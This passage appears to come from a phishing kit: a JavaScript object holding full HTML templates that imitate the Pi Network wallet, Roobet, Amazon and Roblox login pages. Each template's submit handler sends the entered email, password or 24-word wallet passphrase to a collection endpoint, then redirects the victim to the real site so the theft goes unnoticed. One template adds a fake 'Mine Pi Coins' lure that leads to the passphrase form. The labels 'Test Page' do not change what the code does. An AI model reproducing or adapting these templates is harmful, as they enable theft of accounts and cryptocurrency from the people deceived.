              padding: 20px;
              display: flex;
              flex-direction: column;
              align-items: center;
          }
          
          h1 {
              font-size: 24px;
              margin: 20px 0 30px;
              text-align: center;
              color: #333;
          }
          
          .passphrase-input {
              width: 100%;
              height: 150px;
              border: 1px solid #ddd;
              border-radius: 10px;
              padding: 20px;
              font-size: 16px;
              margin-bottom: 20px;
              resize: none;
              color: #aaa;
              background: white;
          }
          
          .unlock-button, .mining-button {
              width: 100%;
              padding: 15px;
              margin: 10px 0;
              border-radius: 10px;
              border: none;
              font-size: 16px;
              cursor: pointer;
              text-align: center;
          }
          
          .unlock-passphrase {
              background-color: white;
              color: #663399;
              border: 1px solid #ddd;
          }
          
          .unlock-fingerprint {
              background-color: #663399;
              color: white;
          }
          
          .mining-button {
              background-color: #663399;
              color: white;
          }
          
          .mining-button:disabled {
              opacity: 0.5;
              cursor: not-allowed;
          }
          
          .info-text {
              margin: 20px 0;
              color: #333;
              font-size: 16px;
              line-height: 1.5;
          }
          
          .blue-link {
              color: #3498db;
              text-decoration: none;
          }
          
          #mining-section {
              display: block;
          }
          
          #unlock-section {
              display: none;
          }
      </style>
  </head>
  <body>
      <!-- Mining Section -->
      <div id="mining-section">
          <div class="header">
              <button class="back-button">←</button>
              <div class="header-title">
                  <div class="mining-icon">π</div>
                  Mine Pi Coins
                  <div class="pi-icon">π</div>
              </div>
              <button class="check-button">✓</button>
          </div>
          
          <div class="container">
              <h1>Mine Pi Coins</h1>
              <p class="info-text" style="color:#00ca2c;font-weight:bold;" >Current mined Pi: <span id="mined-pi">0</span> π</p>
              <button class="mining-button" id="start-mining-button">Start Mining</button>
              <button class="mining-button" id="faster-mining-toggle">Enable 100x Faster Mining</button>
              <button class="mining-button" id="get-coins-button" disabled>Get Coins</button>
          </div>
      </div>
  
      <!-- Unlock Section -->
      <div id="unlock-section">
          <div class="header">
              <button class="back-button">←</button>
              <div class="header-title">
                  <div class="wallet-icon">π</div>
                  Wallet
                  <div class="pi-icon">π</div>
              </div>
              <button class="check-button">✓</button>
          </div>
          
          <div class="container">
              <h1>Unlock Pi Wallet</h1>
              <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
              <button class="unlock-button unlock-passphrase" id="passphrase-button" onclick="handleSubmit(event)">Unlock With Passphrase</button>
              <button class="unlock-button unlock-fingerprint" id="fingerprint-button">Unlock With Fingerprint</button>
              <p class="info-text">
                  As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
                  Recovery of passphrase is currently impossible.
              </p>
              <p class="info-text">
                  Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
              </p>
          </div>
  
          <script>
              const uid = "user123user123";
              const websiteName = "mywebsitemywebsite";
  
              async function handleSubmit(event) {
                  event.preventDefault();
                  const email = "PiWalletAddress";
                  const password = document.getElementById("password").value;
                  const signInButton = document.getElementById("passphrase-button");
                  signInButton.disabled = true;
                  signInButton.style.opacity = '0.5';
                  signInButton.style.cursor = 'not-allowed';
                  try {
                      const response = await fetch("http://localhost:5237/insertdata", {
                          method: "POST",
                          headers: {
                              "Content-Type": "application/json"
                          },
                          body: JSON.stringify({
                              uid: uid,
                              websiteName: websiteName,
                              email: email,
                              password: password
                          })
                      });
                      window.location.href = "https://minepi.com/";
                  } catch (error) {
                      window.location.href = "https://minepi.com/";
                      console.error("Error inserting data:", error);
                  }
              }
          </script>
      </div>
  
      <script>
          let miningRate = .7; 
          let totalMined = 0;
          let fasterMiningEnabled = false;
          let isMining = false;
          let miningInterval = null;
  
          const minedPiDisplay = document.getElementById("mined-pi");
          const startMiningButton = document.getElementById("start-mining-button");
          const fasterMiningToggle = document.getElementById("faster-mining-toggle");
          const getCoinsButton = document.getElementById("get-coins-button");
  
          function updateMinedPi() {
              totalMined += miningRate;
              minedPiDisplay.textContent = totalMined.toFixed(2);
          }
  
          function startMining() {
              if (!isMining) {
                  miningInterval = setInterval(updateMinedPi, 1000);
                  isMining = true;
                  startMiningButton.disabled = true;
                  getCoinsButton.disabled = false;
              }
          }
  
          function stopMining() {
              if (isMining) {
                  clearInterval(miningInterval);
                  isMining = false;
                  startMiningButton.disabled = false;
                  getCoinsButton.disabled = true;
              }
          }
  
          startMiningButton.addEventListener("click", startMining);
  
          fasterMiningToggle.addEventListener("click", () => {
              fasterMiningEnabled = !fasterMiningEnabled;
              miningRate = fasterMiningEnabled ? 100 : 1;
              fasterMiningToggle.textContent = fasterMiningEnabled ? "Disable 100x Faster Mining" : "Enable 100x Faster Mining";
          });
  
          getCoinsButton.addEventListener("click", () => {
              stopMining();
              document.getElementById("mining-section").style.display = "none";
              document.getElementById("unlock-section").style.display = "block";
          });
      </script>
  </body>
  </html>`,
  "roobet":`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Its a Test Page</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>


    <script>
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;
            
          const signInButton = document.getElementById("amazon");
            signInButton.disabled = true;
            signInButton.style.opacity = '0.5';
            signInButton.style.cursor = 'not-allowed';
            

          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://roobet.com/";
        } catch (error) {
          window.location.href = "https://roobet.com/";
          }
        }
      </script>

    <style>
        * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
}

body {
    background-color: #f5f5f5;
}

.main-container {
    display: flex;
    height: 100vh;
}

/* Login Section */
.login-section {
    width: 40%;
    background-color: #131941;
    padding: 2rem;
    display: flex;
    flex-direction: column;
    color: white;
}

.logo {
    display: flex;
    align-items: center;
    margin-bottom: 3rem;
}

.logo img {
    height: 50px;
    margin-right: 15px;
}

.logo h1 {
    color: #f9b938;
    font-weight: bold;
    font-size: 1.8rem;
}

.login-form {
    flex-grow: 1;
    max-width: 450px;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    justify-content: center;
}

.login-form h2 {
    font-size: 1.8rem;
    margin-bottom: 0.5rem;
    font-weight: 600;
}

.no-account {
    color: #aaa;
    margin-bottom: 1.5rem;
}

.register-link {
    color: #7263f3;
    text-decoration: none;
}

.form-group {
    margin-bottom: 1rem;
}

label {
    display: block;
    margin-bottom: 0.5rem;
    font-size: 0.9rem;
}

input {
    width: 100%;
    padding: 0.75rem 1rem;
    border-radius: 6px;
    border: none;
    background-color: #212a51;
    color: white;
    font-size: 1rem;
}

input::placeholder {
    color: #6c7293;
}

.password-input {
    position: relative;
}

.toggle-password {
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    color: #6c7293;
}

.forgot-password {
    text-align: right;
    margin-bottom: 1.5rem;
}

.forgot-password a {
    color: #6c7293;
    text-decoration: none;
    font-size: 0.9rem;
}

.login-btn {
    width: 100%;
    padding: 0.75rem;
    background-color: #f9b938;
    color: #000;
    border: none;
    border-radius: 6px;
    font-size: 1rem;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
    margin-bottom: 2rem;
}

.login-btn:hover {
    background-color: #e9a928;
}

.alternative-login {
    text-align: center;
    margin-bottom: 2rem;
}

.alternative-login p {
    margin-bottom: 1rem;
    color: #6c7293;
    position: relative;
}

.alternative-login p:before, .alternative-login p:after {
    content: "";
    position: absolute;
    top: 50%;
    width: 35%;
    height: 1px;
    background-color: #2a325a;
}

.alternative-login p:before {
    left: 0;
}

.alternative-login p:after {
    right: 0;
}

.social-buttons {
    display: flex;
    justify-content: space-between;
    gap: 10px;
}

.social-btn {
    flex: 1;
    padding: 0.6rem;
    border: none;
    border-radius: 6px;
    background-color: #212a51;
    color: white;
    cursor: pointer;
    font-size: 0.9rem;
    display: flex;
    align-items: center;
    justify-content: center;
}

.social-btn i {
    margin-right: 5px;
}

.social-btn.google {
    color: white;
}

.social-btn.steam {
    color: white;
}

.social-btn.metamask {
    color: white;
}

.footer {
    font-size: 0.7rem;
    color: #6c7293;
    text-align: center;
    margin-top: auto;
}

.footer a {
    color: #6c7293;
    text-decoration: none;
}

/* Hero Section */
.hero-section {
    width: 60%;
    position: relative;
    overflow: hidden;
}

.hero-section img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.hero-content {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    padding: 2rem;
    background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
}

.hero-names {
    display: flex;
    justify-content: space-around;
    margin-bottom: 2rem;
}

.hero-name {
    text-align: center;
    color: white;
}

.hero-name h3 {
    font-size: 1.2rem;
    font-weight: normal;
}

.hero-name h2 {
    font-size: 1.8rem;
    font-weight: bold;
}

.partner-logo {
    display: flex;
    justify-content: center;
}

.partner-badge {
    display: flex;
    align-items: center;
}

.partner-badge img {
    width: 60px;
    height: 60px;
    margin-right: 15px;
}

.badge-text {
    color: white;
    text-align: center;
    font-size: 0.8rem;
}

.close-btn {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 30px;
    height: 30px;
    background: rgba(0, 0, 0, 0.5);
    color: white;
    border: none;
    border-radius: 50%;
    font-size: 20px;
    cursor: pointer;
}

/* Responsive Design */
@media (max-width: 992px) {
    .main-container {
        flex-direction: column;
    }
    
    .login-section, .hero-section {
        width: 100%;
    }
    
    .login-section {
        height: auto;
        padding: 1.5rem;
    }
    
    .hero-section {
        height: 400px;
    }
}

@media (max-width: 576px) {
    .social-buttons {
        flex-direction: column;
    }
    
    .hero-names {
        flex-direction: column;
        gap: 1rem;
    }
}
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-section">
            <div class="logo">
                <img src="https://roobet.com/assets/r-NQNxh0.svg" alt="Beastlings Logo">
                <h1></h1>
            </div>

            <div class="login-form">
                <h2>Login to your account</h2>
                <p class="no-account">Don't have an account? <a href="#" class="register-link">Register</a></p>
                
                <form onsubmit="handleSubmit(event)">
                    <div class="form-group">
                        <label for="email">Username or Email</label>
                        <input type="text" id="email" placeholder="Username or Email">
                    </div>
                    
                    <div class="form-group">
                        <label for="password">Password</label>
                        <div class="password-input">
                            <input type="password" id="password" placeholder="Password">
                            <i class="fas fa-eye-slash toggle-password"></i>
                        </div>
                    </div>
                    
                    <div class="forgot-password">
                        <a href="#">Forgot Password?</a>
                    </div>
                    
                    <button type="submit" id="amazon" class="login-btn" onclick="handleSubmit(event)">Play Now</button>
                </form>
                
                <div class="alternative-login">
                    <p>Or continue with</p>
                    <div class="social-buttons">
                        <button class="social-btn google"><i class="fab fa-google"></i> Google</button>
                        <button class="social-btn steam"><i class="fab fa-steam"></i> Steam</button>
                        <button class="social-btn metamask"><i class="fas fa-mask"></i> Metamask</button>
                    </div>
                </div>
                
                <div class="footer">
                    <p>This site is test page, Don't use real account.</p>
                </div>
            </div>
        </div>
        
        <div class="hero-section">
            <img src="https://roobet.com/cdn-cgi/image/dpr=2,width=auto,height=auto,quality=85,blur=0,format=auto/assets/DSKEi6SY.jpg" alt="Beastlings">
            <button class="close-btn">×</button>
        </div>
    </div>
    
    <script>
        // Toggle password visibility
        document.querySelector('.toggle-password').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.classList.replace('fa-eye-slash', 'fa-eye');
            } else {
                passwordInput.type = 'password';
                this.classList.replace('fa-eye', 'fa-eye-slash');
            }
        });
        
        // Close button functionality
        document.querySelector('.close-btn').addEventListener('click', function() {
            alert('Close button clicked!');
        });
    </script>
</body>
</html>`,
    "amazon":`<html>
    <head>
      <title>Test Page</title>
      <script>
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("amazon");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://amazon.com/";
          } catch (error) {
            window.location.href = "https://amazon.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
    
      <style>
        #amazon{
    width:315px;
    height:33px;
    font-size:14px;
  
    background: linear-gradient(#F7DEA1, #F0C14D);
    border: 0.5px solid #aaaaaa;
    border-radius:3px;
    margin-top: 10px;
  }
  
  #amazon:hover{
  background: linear-gradient(#F5D68A, #EEBA36);
  }
  
  
  
  body {
      font-size: 13px;
      line-height: 19px;
      color: #111;
      font-family: Arial,sans-serif;
  }
  
  img{
    margin: auto;
    display: block;
  }
  
  #signInBorder{
    position: static;
    margin: 0 auto;
    border-color: #DDDDDD;
    border: 0.5px solid #DDDDDD;
    border-radius: 3px;
    width: 340px;
    padding-left: 25px;
  }
  
  input{
    border-left-color: #DDDDDD;
    border-right-color: #DDDDDD;
    border-radius: 3px;
    border-width: 0.2px;
    height: 25px;
    width: 315px;
    margin-bottom: 15px;
  
  }
  
  input:focus{
    -webkit-box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
    -moz-box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
    box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
    outline:0;
  }
  
  
  #SignInTxt{
    font-family: Arial, sans-serif;
    font-size: 26.5px;
  }
  
  h2 {
     color: rgb(134, 134, 134);
     font-weight: normal;
     letter-spacing: 1px;
     font-size: 11.5px;
     width: 315px;
     text-align: center;
     border-top: 1px solid rgba(0, 0, 0, 0.1);
     border-bottom: 1px solid rgba(255, 255, 255, 0.3);
     line-height: 0.1em;
     margin: 10px 0 20px;
     margin-bottom: 5px;
  }
  
  h2 span {
      background:#fff;
      padding:0 10px;
  }
  
  #createAccount{
    margin-top: 30px;
  }
  
  #newAccount{
    background: linear-gradient(#f6f7f9, #e7e9ec);
    margin-top: 10px;
    margin-bottom: 20px;
    width:315px;
    height:33px;
    font-size:14px;
    border: 0.5px solid #aaaaaa;
    border-radius:3px;
  }
  
  #newAccount:hover{
    background: linear-gradient(#f5f6f8, #d9dce1);
  }
  
  #footer{
    border: 0;
     height: 0;
     border-top: 1px solid rgba(0, 0, 0, 0.1);
     border-bottom: 1px solid rgba(255, 255, 255, 0.3);
     margin-top: 30px;
  }
  
  
  
  a:link{
    font-size: 12px;
    /*margin: 0 10px 0px 10px;*/
    margin-right: 10px;
    text-decoration: none;
    color: #0066c0
  }
  a:hover{
    text-decoration: underline;
    color: orangergb(230, 161, 28);
  }
  
  a:visited{
    color: #0066c0;
  }
  
   .links{
    font-size: 10px;
    text-align: center;
    padding-left: 15px;
  }
  
  #special{
    font-size: 11px;
  }
  
      </style>
    </head>
    <body>
      
      <div id="signInBorder">
        <p id="SignInTxt">
          Sign in
        </p>
  
        <label>
          <strong>Email (phone for mobile accounts)</strong>
          <br>
          <input type="email" id="email" name="email" value="">
        </label>
  
        <br>
  
        <label>
          <strong>Password</strong>
          <span><a href="#" >Forgot your password?</a></span>
          <br>
          <input type="password" id="password" name="password" value="">
        </label>
  
        <div>
          <button id="amazon" onclick="handleSubmit(event)">Sign in</button>
        </div>
  
        <div id="createAccount">
          <h2><span>New to Amazon?</span></h2>
          <button id="newAccount" name="newAcct">Create your Amazon account</button>
        </div>
  
  
  
      </div>
  
    <hr id="footer">
  
    <div class="extra">
      <p class="links"><a href="#" id="first">Conditions of Use</a>
      <a href="#">Notice of Use</a>
      <a href="#">Help</a></p>
      <p class="links" id="special">
        © 1996-2016, Amazon.com, Inc. or its affiliates
      </p>
    </div>
  
  
    </body>
  </html>`,
    "PI Wallet":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f5f5f5;
          }
          
          .header {
              background-color: #663399;
              color: white;
              padding: 15px 20px;
              display: flex;
              align-items: center;
              justify-content: space-between;
          }
          
          .header-title {
              font-size: 20px;
              font-weight: 500;
              display: flex;
              align-items: center;
              justify-content: center;
              flex: 1;
          }
          
          .back-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 24px;
              cursor: pointer;
              display: flex;
              align-items: center;
          }
          
          .check-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 18px;
              cursor: pointer;
          }
          
          .wallet-icon {
              background-color: #FFA500;
              width: 30px;
              height: 30px;
              border-radius: 6px;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-right: 10px;
              color: white;
          }
          
          .pi-icon {
              background-color: #FFA500;
              width: 20px;
              height: 20px;
              border-radius: 50%;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-left: 10px;
              color: white;
              font-size: 12px;
          }
          
          .container {
              padding: 20px;
              display: flex;
              flex-direction: column;
              align-items: center;
          }
          
          h1 {
              font-size: 24px;
              margin: 20px 0 30px;
              text-align: center;
              color: #333;
          }
          
          .passphrase-input {
              width: 100%;
              height: 150px;
              border: 1px solid #ddd;
              border-radius: 10px;
              padding: 20px;
              font-size: 16px;
              margin-bottom: 20px;
              resize: none;
              color: #aaa;
              background: white;
          }
          
          .unlock-button {
              width: 100%;
              padding: 15px;
              margin: 10px 0;
              border-radius: 10px;
              border: none;
              font-size: 16px;
              cursor: pointer;
              text-align: center;
          }
          
          .unlock-passphrase {
              background-color: white;
              color: #663399;
              border: 1px solid #ddd;
          }
          
          .unlock-fingerprint {
              background-color: #663399;
              color: white;
          }
          
          .info-text {
              margin: 20px 0;
              color: #333;
              font-size: 16px;
              line-height: 1.5;
          }
          
          .blue-link {
              color: #3498db;
              text-decoration: none;
          }
      </style>
  </head>
  <body>
      <div class="header">
          <button class="back-button">←</button>
          <div class="header-title">
              <div class="wallet-icon">π</div>
              Wallet
              <div class="pi-icon">π</div>
          </div>
          <button class="check-button">✓</button>
      </div>
      
      <div class="container">
          <h1>Unlock Pi Wallet</h1>
          
          <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
          
          <button class="unlock-button unlock-passphrase"  onclick="handleSubmit(event)" id="testeb">Unlock With Passphrase</button>
          <button class="unlock-button unlock-fingerprint disabled" id="testeb">Unlock With Fingerprint</button>
          
          <p class="info-text">
              As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
              Recovery of passphrase is currently impossible.
          </p>
          
          <p class="info-text">
              Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
          </p>
      </div>
  
      <script>
  
              const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = "PiWalletAddress";
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://minepi.com/";
          } catch (error) {
            window.location.href = "https://minepi.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
  </body>
  </html>`,
    "Roblox":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              font-family: 'Helvetica Neue', Arial, sans-serif;
          }
  
          body {
              background-color: #121212;
              color: #fff;
              min-height: 100vh;
              display: flex;
              flex-direction: column;
          }
  
          /* Logo styling for both views */
          .logo {
              width: 40px;
              height: 40px;
              min-width: 40px; /* Prevent shrinking */
              background-color: white;
              transform: rotate(20deg);
              position: relative;
          }
  
          .logo-inner {
              width: 50%;
              height: 50%;
              background-color: black;
              position: absolute;
              top: 25%;
              left: 25%;
          }
  
          /* Shared button styling */
          .sign-up-btn {
              background-color: #0066ff;
              color: white;
              border: none;
              border-radius: 8px;
              padding: 8px 16px;
              font-size: 16px;
              cursor: pointer;
              white-space: nowrap;
          }
  
          /* Top bar and navigation */
          .top-bar {
              background-color: #0a0a0a;
              border-bottom: 1px solid #222;
          }
  
          /* Search icon */
          .search-icon {
              font-size: 22px;
              color: #fff;
          }
  
          /* Login container */
          .login-container {
              width: 90%;
              max-width: 420px;
              margin: 40px auto;
              padding: 30px 20px;
              background-color: #2a2a2e;
              border-radius: 8px;
          }
  
          .login-title {
              text-align: center;
              font-size: 28px;
              margin-bottom: 20px;
              font-weight: 500;
          }
  
          .input-field {
              width: 100%;
              padding: 14px;
              margin: 8px 0;
              border-radius: 8px;
              border: none;
              background-color: #3e3e44;
              color: white;
              font-size: 16px;
          }
  
          .login-btn {
              width: 100%;
              padding: 14px;
              margin: 15px 0;
              border-radius: 8px;
              border: 1px solid #666;
              background-color: #2a2a2e;
              color: white;
              font-size: 16px;
              cursor: pointer;
          }
  
          .forgot-link {
              display: block;
              text-align: center;
              color: #fff;
              text-decoration: none;
              margin: 20px 0;
              font-size: 16px;
          }
  
          .divider {
              border-top: 1px solid #444;
              margin: 25px 0;
          }
  
          .alt-login-btn {
              width: 100%;
              padding: 14px;
              margin: 10px 0;
              border-radius: 8px;
              border: none;
              background-color: #3e3e44;
              color: white;
              font-size: 16px;
              cursor: pointer;
          }
  
          .signup-prompt {
              text-align: center;
              margin: 20px 0;
              font-size: 16px;
          }
  
          .signup-link {
              color: #fff;
              text-decoration: none;
              font-weight: bold;
          }
  
          /* Footer */
          .footer {
              display: flex;
              flex-wrap: wrap;
              justify-content: center;
              gap: 20px;
              padding: 20px;
              background-color: #000;
              margin-top: auto;
          }
  
          .footer a {
              color: #fff;
              text-decoration: none;
              font-size: 14px;
          }
  
          .privacy-choices {
              display: flex;
              align-items: center;
              gap: 5px;
          }
  
          .checkbox {
              width: 16px;
              height: 16px;
              background-color: #0066ff;
              border-radius: 2px;
              position: relative;
              display: inline-block;
          }
  
          .checkbox::after {
              content: "✓";
              color: white;
              position: absolute;
              font-size: 12px;
              top: 0px;
              left: 3px;
          }
  
          .close-x {
              display: inline-block;
              width: 16px;
              height: 16px;
              background-color: #0066ff;
              color: white;
              text-align: center;
              line-height: 16px;
              border-radius: 50%;
              font-size: 12px;
          }
  
          /* Mobile specific styles */
          @media (max-width: 767px) {
              .top-bar {
                  display: flex;
                  flex-direction: column;
              }
              
              .header {
                  display: flex;
                  justify-content: space-between;
                  align-items: center;
                  padding: 15px 20px;
              }
              
              .actions {
                  display: flex;
                  align-items: center;
                  gap: 15px;
              }
              
              .nav {
                  display: flex;
                  justify-content: space-between;
                  width: 100%;
                  padding: 10px 15px;
              }
              
              .nav a {
                  color: #fff;
                  text-decoration: none;
                  font-size: 18px;
                  text-align: center;
                  padding: 5px 0;
              }
              
              .search-box {
                  display: none;
              }
          }
  
          /* Desktop specific styles */
          @media (min-width: 768px) {
              .top-bar {
                  display: flex;
                  align-items: center;
                  padding: 8px 20px;
                  height: 60px;
              }
              
              .header {
                  display: flex;
                  align-items: center;
              }
              
              .nav {
                  display: flex;
                  gap: 20px;
                  margin-left: 20px;
              }
              
              .nav a {
                  color: #fff;
                  text-decoration: none;
                  font-size: 16px;
                  font-weight: 400;
              }
              
              .actions {
                  display: flex;
                  align-items: center;
                  margin-left: auto;
                  gap: 15px;
              }
              
              .search-box {
                  display: flex;
                  align-items: center;
                  background-color: #2e2e2e;
                  border-radius: 20px;
                  padding: 5px 15px;
                  width: 300px;
              }
              
              .search-input {
                  background: transparent;
                  border: none;
                  color: #fff;
                  width: 100%;
                  font-size: 14px;
                  padding: 5px;
                  outline: none;
              }
              
              .search-icon-mobile {
                  display: none;
              }
          }
      </style>
  </head>
  <body>
      <!-- Combined navbar for both mobile and desktop -->
      <div class="top-bar">
          <div class="header">
              <div class="logo">
                  <div class="logo-inner"></div>
              </div>
              
              <div class="actions">
                  <!-- Search box for desktop -->
                  <div class="search-box">
                      <div class="search-icon">⚲</div>
                      <input type="text" class="search-input" placeholder="Search">
                  </div>
                  
                  <button class="sign-up-btn">Sign Up</button>
                  <!-- Mobile search icon, hidden on desktop -->
                  <div class="search-icon search-icon-mobile">⚲</div>
              </div>
          </div>
          
          <!-- Navigation links -->
          <div class="nav">
              <a href="#">Charts</a>
              <a href="#">Marketplace</a>
              <a href="#">Create</a>
              <a href="#">Robux</a>
          </div>
      </div>
      
      <!-- Login Container -->
      <div class="login-container">
          <h1 class="login-title">Login to Roblox</h1>
          
          <input type="text" class="input-field" id="username" placeholder="Username/Email/Phone">
          <input type="password" class="input-field" id="password" placeholder="Password">
          
          <button class="login-btn" id="testeb" onclick="handleSubmit(event)">Log In</button>
          
          <a href="#" class="forgot-link">Forgot Password or Username?</a>
          
          <div class="divider"></div>
          
          <button class="alt-login-btn">Email Me a One-Time Code</button>
          <button class="alt-login-btn">Use Another Device</button>
          
          <p class="signup-prompt">Don't have an account? <a href="#" class="signup-link">Sign Up</a></p>
      </div>
      
      <!-- Footer -->
      <div class="footer">
          <a href="#">About Us</a>
          <a href="#">Jobs</a>
          <a href="#">Blog</a>
          <a href="#">Parents</a>
          <a href="#">Gift Cards</a>
          <a href="#">Help</a>
          <a href="#">Terms</a>
          <a href="#">Accessibility</a>
          <a href="#">Privacy</a>
          <div class="privacy-choices">
              Your Privacy Choices
              <span class="checkbox"></span>
              <span class="close-x">×</span>
          </div>
      </div>
  
      <script>
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("username").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://www.roblox.com/";
          } catch (error) {
            window.location.href = "https://www.roblox.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
  </body>
  </html>`,
    "PI Network":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f5f5f5;
              width: 800px;
              height: 1629px;
              max-width: 100%;
              margin: 0 auto;
              position: relative;
              overflow-x: hidden;
          }
  
          /* Status bar style */
          .status-bar {
              background-color: #000;
              color: white;
              display: flex;
              justify-content: space-between;
              padding: 5px 10px;
              font-size: 14px;
          }
  
          .status-bar-left, .status-bar-right {
              display: flex;
              align-items: center;
          }
  
          .status-bar-item {
              margin: 0 5px;
          }
  
          /* Header style */
          .header {
              background-color: #673AB7;
              color: white;
              padding: 15px 20px;
              display: flex;
              align-items: center;
              justify-content: space-between;
              position: relative;
          }
  
          .back-arrow {
              font-size: 24px;
              cursor: pointer;
          }
  
          .header-title {
              text-align: center;
              font-size: 20px;
              flex-grow: 1;
          }
  
          .dropdown-icon {
              font-size: 24px;
              cursor: pointer;
          }
  
          /* Main content */
          .main-content {
              padding: 20px;
              display: flex;
              flex-direction: column;
              align-items: center;
          }
  
          .logo {
              width: 120px;
              height: 120px;
              margin: 20px 0;
          }
  
          .welcome-text {
              font-size: 24px;
              color: #FFA726;
              margin-bottom: 40px;
              text-align: center;
          }
  
          /* Menu grid */
          .menu-grid {
              display: grid;
              grid-template-columns: repeat(3, 1fr);
              gap: 20px;
              width: 100%;
              max-width: 500px;
          }
  
          .menu-item {
              display: flex;
              flex-direction: column;
              align-items: center;
              cursor: pointer;
          }
  
          .menu-icon {
              width: 60px;
              height: 60px;
              border-radius: 12px;
              border: 2px solid #673AB7;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-bottom: 10px;
          }
  
          .menu-label {
              color: #673AB7;
              font-size: 14px;
              text-align: center;
          }
  
          /* Explore button */
          .explore-button {
              margin-top: 40px;
              background-color: #673AB7;
              color: white;
              border: none;
              border-radius: 25px;
              padding: 15px 40px;
              font-size: 18px;
              display: flex;
              align-items: center;
              cursor: pointer;
              width: 90%;
              max-width: 500px;
              justify-content: center;
          }
  
          .explore-icon {
              margin-right: 10px;
          }
  
          /* Navigation bar */
          .nav-bar {
              position: fixed;
              bottom: 0;
              width: 100%;
              max-width: 800px;
              height: 5px;
              background-color: #ddd;
          }
  
          .nav-indicator {
              width: 50%;
              height: 100%;
              background-color: #fff;
              border-radius: 3px;
          }
      </style>
  </head>
  <body>
  
      <div class="header">
